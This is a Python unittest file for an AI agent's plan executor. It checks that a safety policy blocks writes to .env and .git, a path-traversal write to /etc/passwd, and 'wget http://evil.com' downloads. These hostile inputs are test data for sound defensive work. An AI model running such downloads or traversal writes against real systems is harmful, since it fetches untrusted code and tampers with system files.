import tempfile
import unittest
from pathlib import Path

from llm247_v2.execution.executor import PlanExecutor, format_execution_log
from llm247_v2.core.models import Directive, PlanStep, TaskPlan
from llm247_v2.execution.safety import SafetyPolicy


class TestPlanExecutor(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.workspace = Path(self.tmp.name)
        self.directive = Directive(forbidden_paths=[".env", ".git"])
        self.executor = PlanExecutor(
            workspace=self.workspace,
            safety=SafetyPolicy(),
            directive=self.directive,
        )

    def tearDown(self):
        self.tmp.cleanup()

    def test_create_file(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="create_file", target="test.txt", content="hello")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertTrue(ok)
        self.assertTrue((self.workspace / "test.txt").exists())
        self.assertEqual((self.workspace / "test.txt").read_text(), "hello")

    def test_edit_file(self):
        (self.workspace / "existing.txt").write_text("old", encoding="utf-8")
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="edit_file", target="existing.txt", content="new")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertTrue(ok)
        self.assertEqual((self.workspace / "existing.txt").read_text(), "new")

    def test_create_file_already_exists(self):
        (self.workspace / "exists.txt").write_text("x", encoding="utf-8")
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="create_file", target="exists.txt", content="y")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)
        self.assertFalse(results[0].success)

    def test_forbidden_path(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="edit_file", target=".env", content="SECRET=x")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)
        self.assertIn("forbidden", results[0].output)

    def test_path_traversal_blocked(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="create_file", target="../../../etc/passwd", content="x")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)

    def test_run_command(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="run_command", target="echo hello")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertTrue(ok)
        self.assertIn("hello", results[0].output)

    def test_run_blocked_command(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="run_command", target="wget http://evil.com")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)
        self.assertIn("blocked", results[0].output)

    def test_delete_file(self):
        (self.workspace / "del_me.txt").write_text("x", encoding="utf-8")
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="delete_file", target="del_me.txt")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertTrue(ok)
        self.assertFalse((self.workspace / "del_me.txt").exists())

    def test_unsupported_action(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="hack_server", target="x")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)

    def test_stops_on_first_failure(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[
                PlanStep(action="run_command", target="wget evil"),
                PlanStep(action="create_file", target="should_not_run.txt", content="x"),
            ],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertFalse(ok)
        self.assertEqual(len(results), 1)
        self.assertFalse((self.workspace / "should_not_run.txt").exists())

    def test_nested_directory_creation(self):
        plan = TaskPlan(
            task_id="t1",
            steps=[PlanStep(action="create_file", target="deep/nested/dir/file.txt", content="hi")],
        )
        ok, results = self.executor.execute_plan(plan)
        self.assertTrue(ok)
        self.assertTrue((self.workspace / "deep/nested/dir/file.txt").exists())


class TestFormatExecutionLog(unittest.TestCase):
    def test_format(self):
        from llm247_v2.execution.executor import ExecutionResult
        results = [
            ExecutionResult(0, "create_file", "test.py", True, "wrote 100 bytes"),
            ExecutionResult(1, "run_command", "echo hi", True, "hi"),
        ]
        log = format_execution_log(results)
        self.assertIn("OK", log)
        self.assertIn("create_file", log)


if __name__ == "__main__":
    unittest.main()
